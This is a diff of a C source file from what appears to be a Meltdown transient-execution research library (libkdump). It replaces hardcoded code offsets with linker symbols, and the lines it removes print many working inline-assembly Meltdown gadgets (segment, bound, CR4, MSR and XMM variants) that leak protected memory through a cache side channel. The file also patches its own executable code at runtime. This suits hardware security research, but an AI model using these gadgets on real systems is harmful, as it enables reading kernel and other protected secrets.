@@ -70,35 +70,18 @@ static uint64_t ts = 0;
 #define MAX_MEASUREMENT 100
 #define MAX_WINDOW_SIZE 140
 
-#define CODE_SEQ_OFFSET 0xf
-#define MELTDOWN_STANDARD_ADDR_OFFSET 0x16
-#define MELTDOWN_STANDARD_LEN 0x12
-#define MELTDOWN_CR_ADDR_OFFSET 0x16
-#define MELTDOWN_CR_LEN 0x1d
-#define MELTDOWN_MSR_ADDR_OFFSET 0x16
-#define MELTDOWN_MSR_LEN 0x21
-#define MELTDOWN_XMM_ADDR_OFFSET 0x16
-#define MELTDOWN_XMM_LEN 0x20
-#define MELTDOWN_BOUND_ADDR_OFFSET 0x1a
-#define MELTDOWN_BOUND_LEN 0xf
-#define MELTDOWN_SEGMENT_DS_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_DS_LEN 0x18
-#define MELTDOWN_SEGMENT_SS_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_SS_LEN 0x17
-#define MELTDOWN_SEGMENT_SS_NP_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_SS_NP_LEN 0x17
-#define MELTDOWN_SEGMENT_CS_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_CS_LEN 0xd
-#define MELTDOWN_SEGMENT_DS_NULL_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_DS_NULL_LEN 0x18
-#define MELTDOWN_SEGMENT_SS_NULL_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_SS_NULL_LEN 0x17
-#define MELTDOWN_SEGMENT_DS_PRIVILEGE_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_DS_PRIVILEGE_LEN 0x18
-#define MELTDOWN_SEGMENT_SS_PRIVILEGE_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_SS_PRIVILEGE_LEN 0x17
-#define MELTDOWN_SEGMENT_DS_WRITE_ADDR_OFFSET 0x1a
-#define MELTDOWN_SEGMENT_DS_WRITE_LEN 0x1e
+extern const char meltdown_depth_begin[], meltdown_depth_end[];
+extern const char meltdown_bound_begin[], meltdown_bound_end[];
+extern const char meltdown_segment_ds_begin[], meltdown_segment_ds_end[];
+extern const char meltdown_segment_ss_begin[], meltdown_segment_ss_end[];
+extern const char meltdown_segment_ss_np_begin[], meltdown_segment_ss_np_end[];
+extern const char meltdown_segment_cs_begin[], meltdown_segment_cs_end[];
+extern const char meltdown_segment_ds_null_begin[], meltdown_segment_ds_null_end[];
+extern const char meltdown_segment_ss_null_begin[], meltdown_segment_ss_null_end[];
+extern const char meltdown_segment_ds_privilege_begin[], meltdown_segment_ds_privilege_end[];
+extern const char meltdown_segment_ss_privilege_begin[], meltdown_segment_ss_privilege_end[];
+extern const char meltdown_segment_ds_write_begin[], meltdown_segment_ds_write_end[];
+extern const char meltdown_segment_cs_write_begin[], meltdown_segment_cs_write_end[];
 
 #define LDT_READ 0
 #define LDT_WRITE 1
@@ -312,48 +295,6 @@ asm volatile("sub %%rbx, %%rcx\n"                                             \
 	: "c"(phys), "b"(mem)                                            \
 	: "rax", "rdx", "rdi", "rsi", "edx", "eax", "xmm0", "xmm1");
 
-// ---------------------------------------------------------------------------
-#define meltdown_cr                                                          \
-asm volatile("movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rdi\n"                                              \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movq %%cr4, %%edx\n"                                            \
-	"and $0xff, %%edx\n"                                             \
-	"shl $12, %%edx\n"                                               \
-	"movq (%%rbx, %%edx, 1), %%edx\n"                                 \
-	:                                                                \
-	: "c"(phys), "b"(mem)                                            \
-	: "rax", "rdx", "rdi", "rsi", "edx", "eax", "xmm0", "xmm1");
-
-  // ---------------------------------------------------------------------------
-#define meltdown_msr                                                          \
-asm volatile("movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rbx\n"                                              \
-	"movq $0x1a2, %%rcx\n"                                           \
-	"movq (%%rbx), %%rbx\n"                                         \
-	"rdmsr\n"                                                       \
-	"and $0xff0000, %%rax\n"                                             \
-	"shr $4, %%rax\n"                                               \
-	"movq (%%rdi, %%rax, 1), %%rax\n"                                 \
-	:                                                                \
-	: "c"(phys), "b"(mem)                                            \
-	: "rax", "rdx", "rdi", "rsi", "edx", "eax", "xmm0", "xmm1");
-
-// ---------------------------------------------------------------------------
-#define meltdown_xmm                                                          \
-asm volatile("movq %%rcx, %%rsi\n"                                           \
-	"movq %%rbx, %%rdi\n"                                           \
-	"sub %%rdi, %%rsi\n"                                            \
-	"sub $64, %%rdi\n"                                              \
-	"cpuid\n"                                                       \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movdqa (%%rsi, %%rdi, 1), %%xmm0\n"                            \
-	"movq %%xmm0, %%rax\n"                                          \
-	"movq (%%rdi,%%rax,1), %%rdi\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "rax", "xmm0", "rdi", "rsi", "edx");
-
 #else /* __i386__ */
 
 // ---------------------------------------------------------------------------
@@ -374,15 +315,6 @@ asm volatile("1:\n"                                                          \
 	"movzx (%%ecx), %%eax\n"                                         \
 	"shl $12, %%eax\n"                                              \
 	"jz 1b\n"                                                       \
-	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "eax");
-
-// ---------------------------------------------------------------------------
-#define meltdown_fast                                                          \
-asm volatile("movzx (%%ecx), %%eax\n"                                         \
-	"shl $12, %%eax\n"                                              \
 	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
 	:                                                               \
 	: "c"(phys), "b"(mem)                                           \
@@ -568,219 +500,10 @@ asm volatile("sub %%ebx, %%ecx\n"                                             \
 	: "c"(phys), "b"(mem)                                            \
 	: "eax", "edx", "edi", "esi");
 
-// ---------------------------------------------------------------------------
-#define meltdown_bound                                                          \
-asm volatile("movl %%ebx, %%eax\n"                                         \
-	"add $0x3c0, %%ebx\n"                                         \
-	"bound %%ecx, (%%ebx)\n"                                      \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl (%%eax,%%edx,1), %%eax\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ds                                                          \
-asm volatile("movl $0x7, %%eax\n"                                                  \
-	"movl %%eax, %%ds\n"                                                  \
-	"mfence\n"                                                          \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl %%ss:(%%edi), %%edi\n"                                         \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl %%ss:(%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ss                                                          \
-asm volatile("movl $0x7, %%eax\n"                                                  \
-	"movl %%eax, %%ss\n"                                                  \
-	"mfence\n"                                                            \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl %%ss:(%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ss_np                                                          \
-asm volatile("movl $0x7, %%eax\n"                                                  \
-	"movl %%eax, %%ss\n"                                                  \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl %%ss:(%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_cs                                                          \
-asm volatile("mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl %%cs:(%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ds_null                                                          \
-asm volatile("movl $0x0, %%eax\n"                                                  \
-	"movl %%eax, %%ds\n"                                                  \
-	"mfence\n"                                                            \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl %%ss:(%%edi), %%edi\n"                                         \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl %%ss:(%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ss_null                                                          \
-asm volatile("movl $0x0, %%eax\n"                                                  \
-	"movl %%eax, %%ss\n"                                                  \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl %%ss:(%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ds_privilege                                                          \
-asm volatile("movl $0x18, %%eax\n"                                                  \
-	"movl %%eax, %%ds\n"                                                  \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl %%ss:(%%edi), %%edi\n"                                         \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl %%ss:(%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ss_privilege                                                          \
-asm volatile("movl $0x18, %%eax\n"                                                  \
-	"movl %%eax, %%ss\n"                                                  \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl %%ss:(%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_ds_write                                                          \
-asm volatile("movl $0x7, %%eax\n"                                                  \
-	"movl %%eax, %%ds\n"                                                  \
-	"mfence\n"                                                            \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl %%ss:(%%edi), %%edi\n"                                         \
-	"movl $0x42000, (%%ecx)\n"                                 \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl %%ss:(%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
-// ---------------------------------------------------------------------------
-#define meltdown_segment_cs_write                                                          \
-asm volatile("movl $0x7, %%eax\n"                                                  \
-	"movl %%eax, %%ds\n"                                                  \
-	"mfence\n"                                                            \
-	"mov %%ebx, %%edi\n"                                               \
-	"sub $64, %%edi\n"                                              \
-	"movl (%%edi), %%edi\n"                                         \
-	"movl $0x42000, %%cs:(%%ecx)\n"                                 \
-	"movl (%%ecx), %%edx\n"                                 \
-	"movl (%%ebx,%%edx,1), %%edx\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                              \
-	: "eax", "edx");
-
 #endif
 
 #ifndef MELTDOWN
 #define MELTDOWN meltdown_depth
-#endif
-
-// ---------------------------------------------------------------------------
-void dummy_meltdown_standard() {
-	meltdown_depth;
-}
-
-#ifdef __x86_64__
-
-void dummy_meltdown_cr() {
-	meltdown_cr;
-}
-
-void dummy_meltdown_msr() {
-	meltdown_msr;
-}
-
-void dummy_meltdown_xmm() {
-	meltdown_xmm;
-}
-
-#else
-
-void dummy_meltdown_bound() {
-	meltdown_bound;
-}
-
-void dummy_meltdown_segment_ds() {
-	meltdown_segment_ds;
-}
-
-void dummy_meltdown_segment_ss() {
-	meltdown_segment_ss;
-}
-
-void dummy_meltdown_segment_ss_np() {
-	meltdown_segment_ss_np;
-}
-
-void dummy_meltdown_segment_cs() {
-	meltdown_segment_cs;
-}
-
-void dummy_meltdown_segment_ds_null() {
-	meltdown_segment_ds_null;
-}
-
-void dummy_meltdown_segment_ss_null() {
-	meltdown_segment_ss_null;
-}
-
-void dummy_meltdown_segment_ds_privilege() {
-	meltdown_segment_ds_privilege;
-}
-
-void dummy_meltdown_segment_ss_privilege() {
-	meltdown_segment_ss_privilege;
-}
-
-void dummy_meltdown_segment_ds_write() {
-	meltdown_segment_ds_write;
-}
-
 #endif
 
 // ---------------------------------------------------------------------------
@@ -1671,7 +1394,8 @@ void libkdump_prefetch_read_prepare(size_t addr) {
 int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_handler(size_t legal_addr, 
 	int cache_level, int tlb_present, int expected_data, size_t *code_seq_addr) {
 	if (code_seq_addr != NULL) {
-		*code_seq_addr = (size_t)&&CODE_SEQUENCE;
+		extern const char CODE_SEQUENCE[];
+		*code_seq_addr = (size_t)CODE_SEQUENCE;
 		return -1;
 	}
 
@@ -1702,8 +1426,10 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_han
 			if (to_backup_stack)
 				dump_stack();
 
-			CODE_SEQUENCE:
-			asm volatile("sub %%ebx, %%ecx\n"
+			
+			asm volatile(
+				"CODE_SEQUENCE:\n"
+				"sub %%ebx, %%ecx\n"
 				"sub $64, %%ebx\n" 
 				"movl (%%ebx), %%edi\n"          
 				"movl (%%edi, %%ecx, 1), %%ecx\n"
@@ -1905,67 +1631,48 @@ void libkdump_select_code_sequence(int type, void *code_seq_addr) {
 	size_t base_addr, code_len;
 	switch (type) {
 		case MELTDOWN_STANDARD:
-		base_addr = (size_t)dummy_meltdown_standard + MELTDOWN_STANDARD_ADDR_OFFSET;
-		code_len = MELTDOWN_STANDARD_LEN;
+		base_addr = (size_t)meltdown_depth_begin;
+		code_len = (size_t)meltdown_depth_end - (size_t)meltdown_depth_begin;
 		break;
-#ifdef __x86_64__
-		case MELTDOWN_CR:
-		base_addr = (size_t)dummy_meltdown_cr + MELTDOWN_CR_ADDR_OFFSET;
-		code_len = MELTDOWN_CR_LEN;
-		break;
-		case MELTDOWN_MSR:
-		base_addr = (size_t)dummy_meltdown_msr + MELTDOWN_MSR_ADDR_OFFSET;
-		code_len = MELTDOWN_MSR_LEN;
-		break;
-		case MELTDOWN_XMM:
-		base_addr = (size_t)dummy_meltdown_xmm + MELTDOWN_XMM_ADDR_OFFSET;
-		code_len = MELTDOWN_XMM_LEN;
-		break;
-#else
 		case MELTDOWN_BOUND:
-		base_addr = (size_t)dummy_meltdown_bound + MELTDOWN_BOUND_ADDR_OFFSET;
-		code_len = MELTDOWN_BOUND_LEN;
+		base_addr = (size_t)meltdown_bound_begin;
+		code_len = (size_t)meltdown_bound_end - (size_t)meltdown_bound_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS:
 		case MELTDOWN_SEGMENT_DS_NP:
 		case MELTDOWN_SEGMENT_CS_XO:
-		base_addr = (size_t)dummy_meltdown_segment_ds + MELTDOWN_SEGMENT_DS_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_DS_LEN;
+		base_addr = (size_t)meltdown_segment_ds_begin;
+		code_len = (size_t)meltdown_segment_ds_end - (size_t)meltdown_segment_ds_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS_NULL:
-		base_addr = (size_t)dummy_meltdown_segment_ds_null + MELTDOWN_SEGMENT_DS_NULL_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_DS_NULL_LEN;
+		base_addr = (size_t)meltdown_segment_ds_null_begin;
+		code_len = (size_t)meltdown_segment_ds_null_end - (size_t)meltdown_segment_ds_null_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS:
-		base_addr = (size_t)dummy_meltdown_segment_ss + MELTDOWN_SEGMENT_SS_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_SS_LEN;
+		base_addr = (size_t)meltdown_segment_ss_begin;
+		code_len = (size_t)meltdown_segment_ss_end - (size_t)meltdown_segment_ss_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_RO:
 		case MELTDOWN_SEGMENT_SS_NP:
-		base_addr = (size_t)dummy_meltdown_segment_ss_np + MELTDOWN_SEGMENT_SS_NP_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_SS_NP_LEN;
+		base_addr = (size_t)meltdown_segment_ss_np_begin;
+		code_len = (size_t)meltdown_segment_ss_np_end - (size_t)meltdown_segment_ss_np_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_NULL:
-		base_addr = (size_t)dummy_meltdown_segment_ss_null + MELTDOWN_SEGMENT_SS_NULL_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_SS_NULL_LEN;
+		base_addr = (size_t)meltdown_segment_ss_null_begin;
+		code_len = (size_t)meltdown_segment_ss_null_end - (size_t)meltdown_segment_ss_null_begin;
 		break;
-		// case MELTDOWN_SEGMENT_CS_XO:
-		// base_addr = (size_t)dummy_meltdown_segment_cs + MELTDOWN_SEGMENT_CS_ADDR_OFFSET;
-		// code_len = MELTDOWN_SEGMENT_CS_LEN;
-		// break;
 		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
-		base_addr = (size_t)dummy_meltdown_segment_ds_privilege + MELTDOWN_SEGMENT_DS_PRIVILEGE_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_DS_PRIVILEGE_LEN;
+		base_addr = (size_t)meltdown_segment_ds_privilege_begin;
+		code_len = (size_t)meltdown_segment_ds_privilege_end - (size_t)meltdown_segment_ds_privilege_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
-		base_addr = (size_t)dummy_meltdown_segment_ss_privilege + MELTDOWN_SEGMENT_SS_PRIVILEGE_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_SS_PRIVILEGE_LEN;
+		base_addr = (size_t)meltdown_segment_ss_privilege_begin;
+		code_len = (size_t)meltdown_segment_ss_privilege_end - (size_t)meltdown_segment_ss_privilege_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS_RO:
-		base_addr = (size_t)dummy_meltdown_segment_ds_write+ MELTDOWN_SEGMENT_DS_WRITE_ADDR_OFFSET;
-		code_len = MELTDOWN_SEGMENT_DS_WRITE_LEN;
+		base_addr = (size_t)meltdown_segment_ds_write_begin;
+		code_len = (size_t)meltdown_segment_ds_write_end - (size_t)meltdown_segment_ds_write_begin;
 		break;
-#endif
 		default:
 		break;
 	}
@@ -1987,7 +1694,6 @@ int __attribute__((optimize("-O0"))) libkdump_window_measure(size_t addr, size_t
 
 	size_t code_seq_addr = 0;
 	libkdump_prefetch_read_signal_handler(0, 0, 0, 0, &code_seq_addr);
-	code_seq_addr += CODE_SEQ_OFFSET;
 	printf("code_seq_addr: 0x%lx\n", (unsigned long)code_seq_addr);
 	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
 	libkdump_select_code_sequence(code_type, (void *)code_seq_addr);
@@ -2081,32 +1787,18 @@ int __attribute__((optimize("-O0"))) libkdump_window_measure(size_t addr, size_t
 #endif /* ifdef _MSC_VER */
 #include <immintrin.h>
 
-#define BRANCH_CODE_SEQ_OFFSET (0x5115-0x5101)
-#define BRANCH_MELTDOWN_SEGMENT_STANDARD_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_STANDARD_LEN 0x18
-#define BRANCH_MELTDOWN_SEGMENT_DS_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_DS_LEN 0x18
-#define BRANCH_MELTDOWN_SEGMENT_SS_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_SS_LEN 0x19
-#define BRANCH_MELTDOWN_SEGMENT_SS_NP_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_SS_NP_LEN 0x16
-#define BRANCH_MELTDOWN_SEGMENT_CS_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_CS_LEN 0x19
-#define BRANCH_MELTDOWN_SEGMENT_DS_NULL_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_DS_NULL_LEN 0x18
-#define BRANCH_MELTDOWN_SEGMENT_SS_NULL_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_SS_NULL_LEN 0x16
-#define BRANCH_MELTDOWN_SEGMENT_DS_PRIVILEGE_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_DS_PRIVILEGE_LEN 0x15
-#define BRANCH_MELTDOWN_SEGMENT_SS_PRIVILEGE_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_SS_PRIVILEGE_LEN 0x16
-#define BRANCH_MELTDOWN_SEGMENT_DS_WRITE_ADDR_OFFSET 0xd
-#define BRANCH_MELTDOWN_SEGMENT_DS_WRITE_LEN 0x1e
-// #define BRANCH_MELTDOWN_SEGMENT_DS_COVERT_CHANNEL_INST_LEN 4
+extern const char branch_meltdown_standard_begin[], branch_meltdown_standard_end[];
+extern const char branch_meltdown_segment_ds_begin[], branch_meltdown_segment_ds_end[];
+extern const char branch_meltdown_segment_ss_begin[], branch_meltdown_segment_ss_end[];
+extern const char branch_meltdown_segment_ss_np_begin[], branch_meltdown_segment_ss_np_end[];
+extern const char branch_meltdown_segment_cs_begin[], branch_meltdown_segment_cs_end[];
+extern const char branch_meltdown_segment_ds_null_begin[], branch_meltdown_segment_ds_null_end[];
+extern const char branch_meltdown_segment_ss_null_begin[], branch_meltdown_segment_ss_null_end[];
+extern const char branch_meltdown_segment_ds_privilege_begin[], branch_meltdown_segment_ds_privilege_end[];
+extern const char branch_meltdown_segment_ss_privilege_begin[], branch_meltdown_segment_ss_privilege_end[];
+extern const char branch_meltdown_segment_ds_write_begin[], branch_meltdown_segment_ds_write_end[];
 
-#define ADD_INST_ADDR_OFFSET (BRANCH_MELTDOWN_SEGMENT_DS_ADDR_OFFSET+BRANCH_MELTDOWN_SEGMENT_DS_LEN)
 #define ADD_INST_LEN 3
-#define SUB_INST_ADDR_OFFSET (ADD_INST_ADDR_OFFSET+ADD_INST_LEN)
 #define SUB_INST_LEN 3
 #define COVERT_CHANNEL_INST_LEN 4
 #define COVERT_CHANNEL_2_INST_LEN 7 // this is used when faulty instruction is a write
@@ -2118,181 +1810,40 @@ size_t *xp3 = NULL;
 size_t *xp4 = NULL;
 
 // ---------------------------------------------------------------------------
-#define branch_meltdown_segment_standard                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x2b, %edx\n"                                                  \
-	"movl %edx, %ds\n"                                                  \
-	"mfence\n"                                                          \
-	"movl %es:(%eax), %eax\n\t"                                  \
-	"movl (%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ds                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x7, %edx\n"                                                  \
-	"movl %edx, %ds\n"                                                  \
-	"mfence\n"                                                          \
-	"movl %es:(%eax), %eax\n\t"                                  \
-	"movl (%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n"                                 \
-	"add $1, %ecx\n\t"                                 \
-	"sub $1, %ecx\n\t");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ss                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x7, %edx\n"                                                  \
-	"movl %edx, %ss\n"                                                  \
-	"mfence\n"                                                            \
-	"movl %es:(%eax), %eax\n\t"                                  \
-	"movl %ss:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ss_np                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x7, %edx\n"                                                  \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl %edx, %ss\n"                                                  \
-	"movl %ss:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_cs                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x2b, %edx\n"                                                  \
-	"movl %edx, %ds\n"                                                  \
-	"mfence\n"                                                            \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl %cs:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ds_null                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x0, %edx\n"                                                  \
-	"movl %edx, %ds\n"                                                  \
-	"mfence\n"                                                          \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl (%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ss_null                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x0, %edx\n"                                                  \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl %edx, %ss\n"                                                  \
-	"movl %ss:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ds_privilege                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x18, %edx\n"                                                  \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl %edx, %ds\n"                                                  \
-	"movl %ds:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ss_privilege                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x18, %edx\n"                                                  \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl %edx, %ss\n"                                                  \
-	"movl %ss:(%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_segment_ds_write                                                          \
-asm volatile("movl $0x1, %eax\n\t"                                              \
-	"movl $0x7, %edx\n"                                                  \
-	"movl %edx, %ds\n"                                                  \
-	"mfence\n"                                                            \
-	"movl %es:(%eax), %eax\n"                                 \
-	"movl $0x42000, (%ecx)\n"                                 \
-	"movl (%ecx), %ecx\n"                                 \
-	"movl %es:(%ebx,%ecx,1), %ecx\n");
-
-void dummy_branch_meltdown_segment_standard()
-{
-	branch_meltdown_segment_standard;
-}
-
-void dummy_branch_meltdown_segment_ds()
-{
-	branch_meltdown_segment_ds;
-}
-
-void dummy_branch_meltdown_segment_ss() {
-	branch_meltdown_segment_ss;
-}
-
-void dummy_branch_meltdown_segment_ss_np() {
-	branch_meltdown_segment_ss_np;
-}
-
-void dummy_branch_meltdown_segment_cs() {
-	branch_meltdown_segment_cs;
-}
-
-void dummy_branch_meltdown_segment_ds_null() {
-	branch_meltdown_segment_ds_null;
-}
-
-void dummy_branch_meltdown_segment_ss_null() {
-	branch_meltdown_segment_ss_null;
-}
-
-void dummy_branch_meltdown_segment_ds_privilege() {
-	branch_meltdown_segment_ds_privilege;
-}
-
-void dummy_branch_meltdown_segment_ss_privilege() {
-	branch_meltdown_segment_ss_privilege;
-}
-
-void dummy_branch_meltdown_segment_ds_write() {
-	branch_meltdown_segment_ds_write;
-}
-
-// ---------------------------------------------------------------------------
 void libkdump_insert_speculative_instruction(int code_type, int number, void *code_seq_addr) {
 	size_t base_addr = (size_t)code_seq_addr, from_addr;
 	size_t step_size, to_addr;
 
 	switch (code_type) {
 		case MELTDOWN_SEGMENT_STANDARD:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_STANDARD_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin);
 		break;
 		case MELTDOWN_SEGMENT_DS:
 		case MELTDOWN_SEGMENT_DS_NP:
 		case MELTDOWN_SEGMENT_CS_XO:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_DS_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_end - (size_t)branch_meltdown_segment_ds_begin);
 		break;
 		case MELTDOWN_SEGMENT_DS_NULL:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_DS_NULL_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_null_end - (size_t)branch_meltdown_segment_ds_null_begin);
 		break;
 		case MELTDOWN_SEGMENT_SS:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_SS_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_end - (size_t)branch_meltdown_segment_ss_begin);
 		break;
 		case MELTDOWN_SEGMENT_SS_RO:
 		case MELTDOWN_SEGMENT_SS_NP:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_SS_NP_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_np_end - (size_t)branch_meltdown_segment_ss_np_begin);
 		break;
 		case MELTDOWN_SEGMENT_SS_NULL:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_SS_NULL_LEN;
